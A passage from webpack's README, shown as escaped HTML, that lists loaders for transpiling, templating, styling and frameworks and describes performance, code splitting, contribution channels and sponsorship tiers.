&lt;p&gt;| Name | Status | Install Size | Description | | :--------------------------------------------------------------------------------------------------------------------------------------------------------: | :------------: | :-------------: | :--------------------------------------------------------------------------------------------------- | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/babel-loader.svg&quot; alt=&quot;babel-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=babel-loader&quot; alt=&quot;babel-size&quot;&gt; | Loads ES2015+ code and transpiles to ES5 using 
 &lt;!-- raw HTML omitted --&gt;Babel
 &lt;!-- raw HTML omitted --&gt; | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/traceur-loader.svg&quot; alt=&quot;traceur-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=traceur-loader&quot; alt=&quot;traceur-size&quot;&gt; | Loads ES2015+ code and transpiles to ES5 using &lt;a href=&quot;https://github.com/google/traceur-compiler&quot;&gt;Traceur&lt;/a&gt; | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/ts-loader.svg&quot; alt=&quot;type-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=ts-loader&quot; alt=&quot;type-size&quot;&gt; | Loads TypeScript like JavaScript | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/coffee-loader.svg&quot; alt=&quot;coffee-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=coffee-loader&quot; alt=&quot;coffee-size&quot;&gt; | Loads CoffeeScript like JavaScript |&lt;/p&gt; 
&lt;h4&gt;Templating&lt;/h4&gt; 
&lt;p&gt;| Name | Status | Install Size | Description | | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :-------------: | :--------------: | :-------------------------------------------------------------------------------------- | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/html-loader.svg&quot; alt=&quot;html-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=html-loader&quot; alt=&quot;html-size&quot;&gt; | Exports HTML as string, requires references to static resources | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/pug-loader.svg&quot; alt=&quot;pug-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=pug-loader&quot; alt=&quot;pug-size&quot;&gt; | Loads Pug templates and returns a function | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/markdown-loader.svg&quot; alt=&quot;md-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=markdown-loader&quot; alt=&quot;md-size&quot;&gt; | Compiles Markdown to HTML | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/posthtml-loader.svg&quot; alt=&quot;posthtml-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=posthtml-loader&quot; alt=&quot;posthtml-size&quot;&gt; | Loads and transforms a HTML file using &lt;a href=&quot;https://github.com/posthtml/posthtml&quot;&gt;PostHTML&lt;/a&gt; | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/handlebars-loader.svg&quot; alt=&quot;hbs-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=handlebars-loader&quot; alt=&quot;hbs-size&quot;&gt; | Compiles Handlebars to HTML |&lt;/p&gt; 
&lt;h4&gt;Styling&lt;/h4&gt; 
&lt;p&gt;| Name | Status | Install Size | Description | | :-------------------------------------------------------------------------------------------------------------------------------------------: | :------------: | :-------------: | :----------------------------------------------------------------------- | | 
 &lt;!-- raw HTML omitted --&gt;&lt;code&gt;&amp;lt;style&amp;gt;&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/style-loader.svg&quot; alt=&quot;style-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=style-loader&quot; alt=&quot;style-size&quot;&gt; | Add exports of a module as style to DOM | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/css-loader.svg&quot; alt=&quot;css-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=css-loader&quot; alt=&quot;css-size&quot;&gt; | Loads CSS file with resolved imports and returns CSS code | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/less-loader.svg&quot; alt=&quot;less-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=less-loader&quot; alt=&quot;less-size&quot;&gt; | Loads and compiles a LESS file | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/sass-loader.svg&quot; alt=&quot;sass-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=sass-loader&quot; alt=&quot;sass-size&quot;&gt; | Loads and compiles a Sass/SCSS file | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/stylus-loader.svg&quot; alt=&quot;stylus-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=stylus-loader&quot; alt=&quot;stylus-size&quot;&gt; | Loads and compiles a Stylus file | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/postcss-loader.svg&quot; alt=&quot;postcss-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=postcss-loader&quot; alt=&quot;postcss-size&quot;&gt; | Loads and transforms a CSS/SSS file using &lt;a href=&quot;https://postcss.org&quot;&gt;PostCSS&lt;/a&gt; |&lt;/p&gt; 
&lt;h4&gt;Frameworks&lt;/h4&gt; 
&lt;p&gt;| Name | Status | Install Size | Description | | :----------------------------------------------------------------------------------------------------------------------------------------------------------: | :------------: | :-------------: | :----------------------------------------------------------------------------------------------------- | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/vue-loader.svg&quot; alt=&quot;vue-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=vue-loader&quot; alt=&quot;vue-size&quot;&gt; | Loads and compiles Vue Components | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/polymer-webpack-loader.svg&quot; alt=&quot;polymer-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=polymer-webpack-loader&quot; alt=&quot;polymer-size&quot;&gt; | Process HTML &amp;amp; CSS with preprocessor of choice and &lt;code&gt;require()&lt;/code&gt; Web Components like first-class modules | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/angular2-template-loader.svg&quot; alt=&quot;angular-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=angular2-template-loader&quot; alt=&quot;angular-size&quot;&gt; | Loads and compiles Angular 2 Components | | 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; | &lt;img src=&quot;https://img.shields.io/npm/v/riot-tag-loader.svg&quot; alt=&quot;riot-npm&quot;&gt; | &lt;img src=&quot;https://packagephobia.com/badge?p=riot-tag-loader&quot; alt=&quot;riot-size&quot;&gt; | Riot official webpack loader |&lt;/p&gt; 
&lt;h3&gt;Performance&lt;/h3&gt; 
&lt;p&gt;webpack uses async I/O and has multiple caching levels. This makes webpack fast and incredibly &lt;strong&gt;fast&lt;/strong&gt; on incremental compilations.&lt;/p&gt; 
&lt;h3&gt;Module Formats&lt;/h3&gt; 
&lt;p&gt;webpack supports ES2015+, CommonJS and AMD modules &lt;strong&gt;out of the box&lt;/strong&gt;. It performs clever static analysis on the AST of your code. It even has an evaluation engine to evaluate simple expressions. This allows you to &lt;strong&gt;support most existing libraries&lt;/strong&gt; out of the box.&lt;/p&gt; 
&lt;h3&gt;&lt;a href=&quot;https://webpack.js.org/guides/code-splitting/&quot;&gt;Code Splitting&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;webpack allows you to split your codebase into multiple chunks. Chunks are loaded asynchronously at runtime. This reduces the initial loading time.&lt;/p&gt; 
&lt;h3&gt;&lt;a href=&quot;https://webpack.js.org/guides/production-build/&quot;&gt;Optimizations&lt;/a&gt;&lt;/h3&gt; 
&lt;p&gt;webpack can do many optimizations to &lt;strong&gt;reduce the output size of your JavaScript&lt;/strong&gt; by deduplicating frequently used modules, minifying, and giving you full control of what is loaded initially and what is loaded at runtime through code splitting. It can also make your code chunks &lt;strong&gt;cache friendly&lt;/strong&gt; by using hashes.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;strong&gt;We want contributing to webpack to be fun, enjoyable, and educational for anyone, and everyone.&lt;/strong&gt; We have a &lt;a href=&quot;https://medium.com/webpack/contributors-guide/home&quot;&gt;vibrant ecosystem&lt;/a&gt; that spans beyond this single repo. We welcome you to check out any of the repositories in &lt;a href=&quot;https://github.com/webpack&quot;&gt;our organization&lt;/a&gt; or &lt;a href=&quot;https://github.com/webpack-contrib&quot;&gt;webpack-contrib organization&lt;/a&gt; which houses all of our loaders and plugins.&lt;/p&gt; 
&lt;p&gt;Contributions go far beyond pull requests and commits. Although we love giving you the opportunity to put your stamp on webpack, we also are thrilled to receive a variety of other contributions including:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/webpack/webpack.js.org&quot;&gt;Documentation&lt;/a&gt; updates, enhancements, designs, or bugfixes&lt;/li&gt; 
 &lt;li&gt;Spelling or grammar fixes&lt;/li&gt; 
 &lt;li&gt;README.md corrections or redesigns&lt;/li&gt; 
 &lt;li&gt;Adding unit, or functional tests&lt;/li&gt; 
 &lt;li&gt;Triaging GitHub issues -- especially determining whether an issue still persists or is reproducible.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://twitter.com/search?q=webpack&quot;&gt;Searching #webpack on twitter&lt;/a&gt; and helping someone else who needs help&lt;/li&gt; 
 &lt;li&gt;Teaching others how to contribute to one of the many webpack&#39;s repos!&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/webpack-contrib/awesome-webpack&quot;&gt;Blogging, speaking about, or creating tutorials&lt;/a&gt; about one of webpack&#39;s many features.&lt;/li&gt; 
 &lt;li&gt;Helping others in our webpack &lt;a href=&quot;https://gitter.im/webpack/webpack&quot;&gt;gitter channel&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;To get started have a look at our &lt;a href=&quot;https://github.com/webpack/webpack/blob/master/CONTRIBUTING.md&quot;&gt;documentation on contributing&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;If you are worried or don&#39;t know where to start, you can &lt;strong&gt;always&lt;/strong&gt; reach out to &lt;a href=&quot;https://twitter.com/thelarkinn&quot;&gt;Sean Larkin (@TheLarkInn) on Twitter&lt;/a&gt; or simply submit an issue and a maintainer can help give you guidance!&lt;/p&gt; 
&lt;p&gt;We have also started a series on our &lt;a href=&quot;https://medium.com/webpack&quot;&gt;Medium Publication&lt;/a&gt; called &lt;a href=&quot;https://medium.com/webpack/contributors-guide/home&quot;&gt;The Contributor&#39;s Guide to webpack&lt;/a&gt;. We welcome you to read it and post any questions or responses if you still need help.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Looking to speak about webpack?&lt;/em&gt; We&#39;d &lt;strong&gt;love&lt;/strong&gt; to review your talk abstract/CFP! You can email it to webpack [at] opencollective [dot] com and we can give pointers or tips!!!&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;If you create a loader or plugin, we would &amp;lt;3 for you to open source it, and put it on npm. We follow the &lt;code&gt;x-loader&lt;/code&gt;, &lt;code&gt;x-webpack-plugin&lt;/code&gt; naming convention.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;We consider webpack to be a low-level tool used not only individually but also layered beneath other awesome tools. Because of its flexibility, webpack isn&#39;t always the &lt;em&gt;easiest&lt;/em&gt; entry-level solution, however we do believe it is the most powerful. That said, we&#39;re always looking for ways to improve and simplify the tool without compromising functionality. If you have any ideas on ways to accomplish this, we&#39;re all ears!&lt;/p&gt; 
&lt;p&gt;If you&#39;re just getting started, take a look at &lt;a href=&quot;https://webpack.js.org/concepts/&quot;&gt;our new docs and concepts page&lt;/a&gt;. This has a high level overview that is great for beginners!!&lt;/p&gt; 
&lt;p&gt;Looking for webpack 1 docs? Please check out the old &lt;a href=&quot;https://github.com/webpack/docs/wiki/contents&quot;&gt;wiki&lt;/a&gt;, but note that this deprecated version is no longer supported.&lt;/p&gt; 
&lt;p&gt;If you want to discuss something or just need help, &lt;a href=&quot;https://gitter.im/webpack/webpack&quot;&gt;here is our Gitter room&lt;/a&gt; where there are always individuals looking to help out!&lt;/p&gt; 
&lt;p&gt;If you are still having difficulty, we would love for you to post a question to &lt;a href=&quot;https://stackoverflow.com/tags/webpack&quot;&gt;StackOverflow with the webpack tag&lt;/a&gt;. It is much easier to answer questions that include your webpack.config.js and relevant files! So if you can provide them, we&#39;d be extremely grateful (and more likely to help you find the answer!)&lt;/p&gt; 
&lt;p&gt;If you are twitter savvy you can tweet #webpack with your question and someone should be able to reach out and help also.&lt;/p&gt; 
&lt;p&gt;If you have discovered a üêú or have a feature suggestion, feel free to create an issue on Github.&lt;/p&gt; 
&lt;h3&gt;License&lt;/h3&gt; 
&lt;p&gt;&lt;a href=&quot;https://app.fossa.io/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fwebpack%2Fwebpack?ref=badge_large&quot;&gt;&lt;img src=&quot;https://app.fossa.io/api/projects/git%2Bhttps%3A%2F%2Fgithub.com%2Fwebpack%2Fwebpack.svg?type=large&quot; alt=&quot;FOSSA Status&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Most of the core team members, webpack contributors and contributors in the ecosystem do this open source work in their free time. If you use webpack for a serious task, and you&#39;d like us to invest more time on it, please donate. This project increases your income/productivity too. It makes development and applications faster and it reduces the required bandwidth.&lt;/p&gt; 
&lt;p&gt;This is how we use the donations:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Allow the core team to work on webpack&lt;/li&gt; 
 &lt;li&gt;Thank contributors if they invested a large amount of time in contributing&lt;/li&gt; 
 &lt;li&gt;Support projects in the ecosystem that are of great value for users&lt;/li&gt; 
 &lt;li&gt;Support projects that are voted most (work in progress)&lt;/li&gt; 
 &lt;li&gt;Infrastructure cost&lt;/li&gt; 
 &lt;li&gt;Fees for money handling&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Before we started using OpenCollective, donations were made anonymously. Now that we have made the switch, we would like to acknowledge these sponsors (and the ones who continue to donate using OpenCollective). If we&#39;ve missed someone, please send us a PR, and we&#39;ll add you to this list.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://opencollective.com/webpack#sponsor&quot;&gt;Become a gold sponsor&lt;/a&gt; and get your logo on our README on Github with a link to your site.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://opencollective.com/webpack#sponsor&quot;&gt;Become a silver sponsor&lt;/a&gt; and get your logo on our README on Github with a link to your site.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://opencollective.com/webpack#sponsor&quot;&gt;Become a bronze sponsor&lt;/a&gt; and get your logo on our README on Github with a link to your site.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt; 
 &lt;!-- raw HTML omitted --&gt;
 &lt;!-- raw HTML omitted --&gt;
